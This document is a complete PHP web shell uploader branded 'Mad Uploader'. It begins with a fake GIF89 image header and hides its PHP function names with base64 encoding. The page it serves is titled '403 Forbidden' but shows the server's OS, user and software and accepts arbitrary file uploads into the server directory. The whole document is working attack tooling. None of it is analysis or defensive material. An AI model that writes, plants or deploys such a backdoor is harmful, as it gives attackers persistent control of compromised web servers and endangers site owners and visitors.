GIF89;a
<?php

$Array = [
    'bW92ZV91cGxvYWRlZF9maWxl', //move_uploaded_file
    'Z2V0Y3dk', // getcwd
    'cGhwX3VuYW1l', // php_uname
    'Z2V0X2N1cnJlbnRfdXNlcg==', // get_current_user
    'U0VSVkVSX1NPRlRXQVJF', // Server Software
    'bmFtZQ==', // name
    'ZmlsZQ==', // file
    'dG1wX25hbWU=', // tmp_name
    'bXVsdGlwYXJ0L2Zvcm0tZGF0YQ==' // multipart
];
$hitung_array = count($Array);
for ($i = 0; $i < $hitung_array; $i++) {
    $fungsi[] = base64_decode($Array[$i]);
}
echo '
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>403 Forbidden</title>
    <style>
        * {
            font-family: monospace;
        }

        ul {
            list-style: none;
        }

        li {
            padding: 5px;
        }

        .footer {
            padding: 20px;
            text-align: center;
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            text-decoration: underline;
        }

        input[type="file"] {
            border: 2px solid black;
            border-radius: 3px;
            box-shadow: 4px 5px 5px rgba(0, 0, 0, 0.2);
        }

        input[type="submit"] {
            border: 2px solid black;
            padding: 3px 14px;
            background-color: transparent;
            border-radius: 3px;
            box-shadow: 4px 5px 5px rgba(0, 0, 0, 0.2);
        }

        input[type="submit"]:hover {
            background-color: black;
            color: white;
            border-radius: 3px;
            border: 2px solid black;
            box-shadow: none;
        }

        .box {
            margin: auto;
            width: 80%;
            border: 2px solid black;
            border-radius: 5px;
            box-shadow: 7px 10px 5px rgba(0, 0, 0, 0.2);
        }

        .header {
            padding: 5px;
            text-align: center;
            color: white;
            background-color: #292929;
            border-radius: 3px;
        }

        .body {
            padding: 10px;
        }

        .body li {
            font-weight: bold;
        }
    </style>
</head>

<body>
    <div class="form">
        <form method="POST" enctype="' . $fungsi[8] . '">
        <ul>
            <li><input type="' . $fungsi[6] . '" name="' . $fungsi[6] . '"></li>
            <li><input type="submit" name="submit" value="Submit"></li>
        </ul>
        </form>
        <div class="box">
            <div class="header">
                &copy;&nbsp;Mad Uploader
            </div>
            <div class="body">
                <ul>
                    <li>' . $fungsi[2]() . '</li>
                    <li>' . $fungsi[3]() . '</li>
                    <li>' . $_SERVER[$fungsi[4]] . '</li>
                </ul>
            </div>
        </div>
    </div>
    <div class="footer">
        <span>&copy;Copyright By MrMad</span>
    </div>
</body>

</html>';
if (isset($_POST['submit'])) {
    $file = $_FILES[$fungsi[6]][$fungsi[7]];
    $fileName = $_FILES[$fungsi[6]][$fungsi[5]];
    if (@$fungsi[0]($file, $fungsi[1]() . '/' . $fileName)) {
        echo '<meta http-equiv="refresh" content="0;url=#success=' . $fileName . '">';
    } else {
        echo '<meta http-equiv="refresh" content="0;url=#failed=' . $fileName . '">';
    }
}
